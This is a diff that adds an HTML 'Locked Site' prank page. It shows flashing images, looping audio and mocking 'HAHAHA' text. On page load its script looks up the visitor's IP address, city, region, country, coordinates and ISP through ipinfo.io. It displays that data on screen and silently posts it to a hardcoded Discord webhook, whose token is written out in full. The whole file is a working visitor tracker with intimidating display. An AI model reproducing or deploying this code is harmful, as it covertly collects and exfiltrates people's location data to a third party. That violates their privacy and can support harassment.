@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Locked Site</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            overflow: hidden;
+            position: relative;
+        }
+        .content {
+            z-index: 2;
+            text-align: center;
+            position: relative;
+            display: none; /* Hidden initially */
+        }
+        img {
+            max-width: 300px;
+            margin: 20px 0;
+        }
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            z-index: 1;
+            display: none; /* Hidden initially */
+            animation: flash 0.5s infinite; /* Flash speed */
+        }
+        @keyframes flash {
+            0%, 50% {
+                background-image: url('jas.png');
+            }
+            50.1%, 100% {
+                background-image: url('jas2.png');
+            }
+        }
+        .ip-text {
+            color: red; /* Change the text color to red */
+            font-weight: bold;
+        }
+        #ipResult {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            color: white;
+            font-size: 16px;
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background for readability */
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .fullscreen-btn {
+            padding: 10px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background-color: red;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .loading-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Initial Blank Screen with Button -->
+<div class="loading-screen">
+    <button id="startBtn" class="fullscreen-btn">Click to Start</button>
+    <p>warning site contains flashing images<p/>
+</div>
+
+<!-- Flashing background -->
+<div class="background"></div>
+
+<!-- Main content -->
+<div class="content">
+    <h2>HAHAHAHAHAHAHAHHA</h2>
+    <div id="ipResult"></div>
+
+    <!-- Audio element -->
+    <audio id="sound" src="sound.mp3" autoplay loop muted></audio>
+</div>
+
+<script>
+    function getMyIpAddress() {
+        fetch("https://ipinfo.io/json")
+            .then(response => response.json())
+            .then(data => {
+                fetch("https://ipinfo.io/" + data.ip + "/json")
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipResultDiv = document.getElementById("ipResult");
+                        ipResultDiv.innerHTML = `
+                            <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
+                            <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
+                            <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
+                            <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
+                            <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
+                            <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
+                        `;
+                        sendToDiscord(data);
+                    })
+                    .catch(error => console.error("Error retrieving IP info:", error));
+            })
+            .catch(error => console.error("Error retrieving IP address:", error));
+    }
+
+    function sendToDiscord(data) {
+        const webhookUrl = "https://discord.com/api/webhooks/1322344664359239720/OP-GxUPNa6rkUfz52ovgWpFBd0aDhghLDaNpwuEc5XxaYJqahFqr4PwaDiKRaJYRFAg9";
+        const payload = {
+            embeds: [
+                {
+                    fields: [
+                        { name: "IP Address", value: data.ip, inline: true },
+                        { name: "City", value: data.city, inline: true },
+                        { name: "Region", value: data.region, inline: true },
+                        { name: "Country", value: data.country, inline: true },
+                        { name: "Location", value: data.loc, inline: true },
+                        { name: "Organization", value: data.org, inline: true }
+                    ],
+                    color: 0xff0000,
+                    timestamp: new Date().toISOString()
+                }
+            ]
+        };
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            if (response.ok) {
+                console.log("Data sent to Discord successfully.");
+            } else {
+                console.error("Error sending data to Discord.");
+            }
+        }).catch(console.error);
+    }
+
+    function enterFullscreenAndPlay() {
+        const audio = document.getElementById("sound");
+        const element = document.documentElement;
+
+        // Request fullscreen
+        if (element.requestFullscreen) element.requestFullscreen();
+        else if (element.mozRequestFullScreen) element.mozRequestFullScreen();
+        else if (element.webkitRequestFullscreen) element.webkitRequestFullscreen();
+        else if (element.msRequestFullscreen) element.msRequestFullscreen();
+
+        // Play audio
+        audio.muted = false;
+        audio.play().catch(error => console.error("Error playing audio:", error));
+
+        // Hide the loading screen and show the content
+        document.querySelector(".loading-screen").style.display = "none";
+        document.querySelector(".background").style.display = "block";
+        document.querySelector(".content").style.display = "block";
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        const startBtn = document.getElementById("startBtn");
+        startBtn.addEventListener("click", enterFullscreenAndPlay);
+
+        // Get IP address and geolocation
+        getMyIpAddress();
+    });
+</script>
+
+</body>
+</html>
